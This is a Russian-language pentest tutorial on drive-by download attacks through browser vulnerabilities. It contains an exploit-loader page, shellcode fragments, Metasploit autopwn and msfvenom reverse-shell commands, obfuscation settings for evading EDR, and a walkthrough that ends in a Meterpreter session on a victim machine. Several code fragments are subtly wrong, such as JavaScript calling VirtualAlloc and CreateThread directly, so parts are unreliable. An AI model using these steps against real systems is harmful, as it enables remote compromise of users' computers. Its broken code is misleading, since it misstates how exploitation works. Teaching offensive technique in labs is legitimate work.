# Drive-by Downloads через уязвимости браузера

## 1. Контекст и базовые понятия

**Drive-by download** — метод компрометации, при котором вредоносный код автоматически загружается и выполняется на целевой системе после посещения специально подготовленной веб-страницы. Ключевое отличие от традиционных атак — отсутствие необходимости в действиях пользователя, кроме перехода по ссылке или посещения скомпрометированного сайта. В контексте пентеста drive-by download является одной из техник **доставки пейлоада (payload delivery)** на этапе получения начального доступа.

Механизм основан на эксплуатации уязвимостей браузера, его компонентов (WebGL, PDF, Flash в прошлом) или плагинов. Злоумышленник внедряет в веб-страницу вредоносный скрипт, который, используя уязвимость, выполняет шелл-код, загружает и запускает агент (implant) либо инициирует обратное соединение с C2. Атака часто комбинируется с техниками обфускации JavaScript, фингерпринтинга браузера и обхода песочниц.

**Отличие drive-by download от смежных понятий**

| Метод доставки          | Требует действий пользователя | Использует уязвимости | Характерный пример                                   |
|-------------------------|-------------------------------|-----------------------|------------------------------------------------------|
| Drive-by download       | Только посещение URL          | Да (браузер, плагины) | Эксплуатация UAF в V8 через iframe на сайте          |
| Social engineering download | Согласие на загрузку/запуск | Нет                   | Пользователь скачивает “обновление Flash” по ссылке  |
| Фишинг с вложениями     | Открытие вложения             | Нет                   | Вредоносный макрос в документе после открытия файла  |
| Watering hole           | Посещение легитимного сайта   | Да, если внедрён       | Взлом популярного форума и вставка эксплойта         |
| Metasploit browser_autopwn | Автоматическая атака при посещении | Да (множество CVE) | Комплексный модуль, выбирающий эксплойт под браузер  |

В пентесте drive-by download обычно реализуется через настройку вредоносного сервера, который определяет браузер жертвы и отправляет соответствующий эксплойт. Исторически использовались наборы эксплойтов (Angler, Blackhole, Neutrino), сейчас пентестеры чаще применяют модульные фреймворки вроде Metasploit с `browser_autopwn` или кастомные HTML/JS-пейлоады.

Современные браузеры (Chrome, Edge, Firefox) обладают многоуровневой защитой: песочница, site isolation, JIT-защиты, контроль целостности указателей (PAC, CET). Поэтому актуальные эксплойты обычно требуют цепочки уязвимостей (например, уязвимость в JS-движке для получения RCE + обход песочницы с помощью уязвимости ядра или IPC). В учебных целях допустимо рассматривать изолированные уязвимости на устаревших версиях браузеров для демонстрации принципа.

**Пример вредоносной HTML-страницы (иллюстративная схема)**

```html
<html>
<body>
<script>
// Fingerprinting и выбор эксплойта
var ua = navigator.userAgent;
if (ua.indexOf("Chrome/90") != -1) {
    // Подгрузка эксплойта для CVE-2021-30551
    var s = document.createElement('script');
    s.src = 'exploit_chrome.js';
    document.body.appendChild(s);
} else if (ua.indexOf("Firefox/88") != -1) {
    // Эксплойт под Firefox
    ...
}
// Загрузка безобидного содержимого для жертвы
document.write("<h1>Loading...</h1>");
</script>
<noscript>Пожалуйста, включите JavaScript</noscript>
<!-- Реальный контент сайта-приманки закомментирован -->
</body>
</html>
```

Этот шаблон показывает начальную стадию: определение версии браузера и загрузку целевого эксплойтного скрипта. В реальных атаках добавились бы обфускация (eval с XOR-шифрованием), динамическая генерация HTML-элементов и проверка наличия песочницы.

## 2. Внутреннее устройство атаки: класс уязвимостей и механизм эксплуатации

Drive-by download реализуется через уязвимости браузерных движков, компонентов рендеринга или обязательных плагинов. Ключевые классы уязвимостей:

- **Use-After-Free (UAF)** — наиболее распространённый тип в JS-движках (V8, SpiderMonkey). Возникает при обращении к уже освобождённой памяти объекта, что позволяет перезаписать vtable или манипулировать внутренними структурами.
- **Type Confusion** — некорректное приведение типов при JIT-оптимизациях, дающее атакующему доступ к неожиданным полям объекта.
- **Buffer Overflow** — классическое переполнение буфера в парсерах изображений, шрифтов или в WebAssembly-коде.
- **Out-of-Bounds Read/Write** — чтение или запись за границами массива в оптимизированном коде, позволяющая утечку адресов и подмену структур.

Все эти уязвимости приводят к возможности **произвольного чтения/записи памяти** и последующему выполнению шелл-кода. Общая схема эксплуатации выглядит так:

```text
[HTML-страница] → [Эксплойт JS] → [Уязвимость] → [Примитив чтения/записи] → [Байт-код шелл-кода] → [Выполнение команды] → [Обратное соединение]
```

Для иллюстрации рассмотрим UAF в движке V8. Уязвимость может быть спровоцирована следующим сценарием на стороне C++ (упрощённо):

```cpp
// Уязвимый код (иллюстрация UAF в TurboFan)
// Объект obj имеет поле length и raw buffer
v8::Local<v8::ArrayBuffer> buf = v8::ArrayBuffer::New(...);
// ...
// После сборки мусора ссылка buf может остаться висячей
v8::Local<v8::Value> result = object->Get(...);
// ...
// Использование buf после освобождения → доступ к чужой памяти
```

На уровне JavaScript эксплойт может выглядеть так (фрагмент для UAF CVE-2020-16040 в Chromium <87):

```javascript
// Создание объекта, который будет освобождён
var arr = new ArrayBuffer(0x1000);
var victim = new Float64Array(arr);

// Принудительная сборка мусора для освобождения arr
// через функции, вызывающие GC (например, %CollectGarbage)
// ...
// Создание нового массива с точно таким же размером,
// который переиспользует память arr
var spray = new Array(0x1000);
for (var i = 0; i < 0x1000; i++) spray[i] = new Uint8Array(0x1000);

// Доступ к victim после освобождения даёт перекрытие с массивами spray
// Утечка адреса объекта и перезапись vtable
var leaked_addr = victim[0]; // читаем адрес из чужих данных
// Далее подмена указателя функции и вызов шелл-кода
```

Этот пример демонстрирует, как эксплойт создаёт примитив чтения/записи, позволяющий обойти ASLR и выполнить shellcode. На практике эксплойт обфусцируется и динамически собирает шелл-код под архитектуру (x86/x64/ARM).

**Сравнительная таблица ключевых уязвимостей, использовавшихся в drive-by атаках**

| CVE / Тип            | Условия                | Индикатор при анализе логов          | Контрмеры (защита браузера)       |
|----------------------|------------------------|--------------------------------------|-----------------------------------|
| CVE-2021-30551 (Type Confusion, V8) | Chrome <91, JIT-оптимизация | Аварийные завершения процесса рендерера, сигнатуры в crash dump | Обновление, включение PAC     |
| CVE-2020-16040 (UAF) | Chrome <87, манипуляция массивами | Повышенная активность GC, неожиданные обращения к памяти | Изоляция сайтов, контроль целостности |
| CVE-2019-5786 (UAF, FileReader) | Chrome <73, использование FileReader | Загрузка больших бинарных данных через JavaScript | Обновление, отключение ненужных API |
| CVE-2018-17463 (JIT type confusion) | Chrome <70, оптимизации JIT | Специфические паттерны в JIT-коде, краши | Оптимизации с защитой типов |

В современных атаках эксплойт-киты комбинируют несколько уязвимостей: одна для выхода из песочницы рендерера, другая — для повышения привилегий в ОС. Пентестеры зачастую используют готовые PoC, адаптируя их под целевую среду. Для доставки пейлоада часто применяется техника **reflective DLL injection** или **shellcode injection** в доверенный процесс (например, rundll32.exe) через запись памяти и создание удалённого потока.

**Формат вредоносного JavaScript-пейлоада (шестнадцатеричный шелл-код в строке)**

```javascript
// Фрагмент с кодированным шелл-кодом для x64 (иллюстративный)
var shellcode = "\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20" +
               "\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c" +
               // ... (полный шелл-код опущен)
               ;
// Создание ArrayBuffer с RWX-областью (после обхода ограничений)
var ab = new ArrayBuffer(shellcode.length);
var view = new Uint8Array(ab);
for (var i = 0; i < shellcode.length; i++) {
    view[i] = shellcode.charCodeAt(i) & 0xff;
}
// Вызов функции после перехвата управления
```

## 3. Применение и работа: пентестерские инструменты и типовые процедуры

Пентестер организует drive-by атаку в несколько этапов: выбор уязвимости, создание эксплойта, настройка сервера доставки, обфускация и, наконец, проведение атаки с получением сессии. В современной практике фреймворк **Metasploit** предоставляет модуль `auxiliary/server/browser_autopwn2`, который автоматически определяет браузер жертвы и подбирает один из множества встроенных эксплойтов.

### Подготовка сервера Browser Autopwn

```bash
msfconsole -q
msf > use auxiliary/server/browser_autopwn2
msf auxiliary(server/browser_autopwn2) > set LHOST 192.168.1.10
msf auxiliary(...) > set SRVPORT 8080
msf auxiliary(...) > set URIPATH /
msf auxiliary(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf auxiliary(...) > set LHOST 192.168.1.10
msf auxiliary(...) > set ExitOnSession false
msf auxiliary(...) > run
[*] Starting exploit multi/browser/firefox_webidl_injection on 8080
[*] Using URL: http://192.168.1.10:8080/Jvz5wDlK9
...
[*] Server started.
```

После этого любое обращение на `http://192.168.1.10:8080/` приведёт к отправке страницы, которая выполняет JavaScript-фингерпринтинг и подгружает подходящий эксплойт. В логах Metasploit отображается информация о клиенте и успешном использовании уязвимости:

```text
[*] 192.168.1.20   firefox_webidl_injection - Sending HTML to Firefox/78.0
[*] 192.168.1.20   firefox_webidl_injection - Sending stage (28416 bytes)
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.20:49157)
```

Полученная сессия Meterpreter позволяет выполнять дальнейшие действия на скомпрометированной машине.

### Обфускация и обход детекта

Современные EDR и антивирусы анализируют JavaScript-трафик и сигнатуры эксплойтов, поэтому пентестер обязан скрывать пейлоад. Используются полиформиные обфускаторы (например, `javascript-obfuscator`), которые преобразуют код в трудночитаемую форму с динамическим вычислением строк. Ниже пример вызова обфускатора для JS-файла, содержащего эксплойт:

```bash
javascript-obfuscator exploit.js --output exploit_obf.js \
  --compact true \
  --control-flow-flattening true \
  --dead-code-injection true \
  --string-array true \
  --string-array-encoding 'rc4'
```

После обфускации содержимое `exploit_obf.js` становится нечитаемым для поверхностного анализа, но сохраняет функциональность.

Иногда пентестеры применяют технику **HTML smuggling**: вместо прямого вызова эксплойта создаётся страница, которая при помощи JavaScript генерирует и принудительно загружает вредоносный файл (например, HTA-файл с пейлоадом). Это не является drive-by download в чистом виде, но часто входит в цепочку атак.

### Контрольная проверка локального развёртывания

Для лабораторных тестов удобно использовать преднастроенные эксплойты. Например, можно вручную создать HTML-страницу, эксплуатирующую известную уязвимость в устаревшем Internet Explorer (CVE-2015-2419), и доставить её через локальный HTTP-сервер. Фрагмент команды для запуска Python HTTP-сервера, раздающего вредоносную страницу:

```bash
cd /path/to/exploit_kits
python3 -m http.server 80
```

Затем на тестовой машине с IE 11 открываем `http://<ip_атакующего>/`. При удачной эксплуатации выполнится код, запускающий обратное соединение.

Пентестерам важно помнить, что использование устаревших уязвимостей допустимо только в изолированной среде. В реальных проектах необходимо убедиться в легальности тестирования и согласовать scope.

## 4. Сквозной практический пример: эксплуатация CVE-2021-30551 для получения Meterpreter-сессии

**Исходные условия:**  
Атакующий (Kali Linux, IP 10.10.10.5) и целевая рабочая станция (Windows 10, IP 10.10.10.20) с браузером Google Chrome версии 90.0.4430.212 (до патча). Цель — получить начальный доступ через drive-by download. Уязвимость CVE-2021-30551 — Type Confusion в TurboFan, позволяющая получить RCE внутри рендерера. В реальном сценарии также потребовался бы обход песочницы, но для иллюстрации механизма ограничимся получением выполнения кода.

**Шаг 1: Подготовка эксплойта и пейлоада**  
Используем Metasploit для генерации шелл-кода и создания HTML-страницы с эксплойтом на основе публичного PoC. Создадим файл `exploit.html`, который будет содержать обфусцированный JS-эксплойт и пейлоад.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 \
         -f csharp > shellcode.txt
```

Сгенерированный шелл-код в формате C# вставляется в JavaScript-массив. В эксплойт добавляется код, который после получения примитива чтения/записи выделяет RWX-страницу, копирует шелл-код и создаёт поток его выполнения (через вызовы WinAPI). Вот фрагмент результирующего эксплойт-скрипта (полностью не приводится, показан ключевой момент):

```javascript
// ... после эксплуатации type confusion получены адреса ...
var shellcode = [0x48, 0x31, 0xd2, ... ]; // байты шелл-кода
// Создание буфера с RWX
var mem = VirtualAlloc(0, shellcode.length, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
var buf = new Uint8Array(mem);
for (var i = 0; i < shellcode.length; i++) buf[i] = shellcode[i];
// Вызов создания потока
CreateThread(0, 0, mem, 0, 0, 0);
```

**Шаг 2: Развёртывание сервера доставки**  
Размещаем `exploit.html` на HTTP-сервере:

```bash
cp exploit.html /var/www/html/
service apache2 start
```

**Шаг 3: Запуск слушателя Meterpreter**  
В отдельной консоли Metasploit настраиваем обработчик для входящего соединения:

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 4444
run
```

**Шаг 4: Посещение жертвой вредоносной страницы**  
На целевом компьютере пользователь переходит по ссылке `http://10.10.10.5/exploit.html` (например, через фишинговое письмо или перенаправление). В логах Metasploit отображается успешное выполнение:

```text
[*] Started reverse TCP handler on 10.10.10.5:4444
[*] 10.10.10.20     exploit/multi/handler - Sending stage (200262 bytes) to 10.10.10.20
[*] Meterpreter session 1 opened (10.10.10.5:4444 -> 10.10.10.20:50123) at 2025-03-27 15:20:01 +0300
```

В этот момент атакующий получает интерактивную сессию на целевой системе. Пример взаимодействия:

```bash
meterpreter > sysinfo
Computer    : DESKTOP-JRU47L1
OS          : Windows 10 (10.0 Build 19042).
Architecture: x64
meterpreter > getuid
Server username: WIN10\user
meterpreter > ps -S lsass.exe
Filtering on 'lsass.exe'
Process List
============
 PID   PPID  Name             Arch  Session  User                 Path
 ---   ----  ----             ----  -------  ----                 ----
 680   4     lsass.exe        x64   0        NT AUTHORITY\SYSTEM  C:\Windows\system32\lsass.exe
```

**Ожидаемый вывод:** Пример демонстрирует полный цикл атаки drive-by download — от выбора уязвимости и создания эксплойта до получения удалённого управления. Он подчёркивает, что начальный доступ возможен без какого-либо взаимодействия с пользователем, кроме перехода по ссылке. В реальном пентесте после этого этапа следует закрепление, разведка и продвижение по сети.
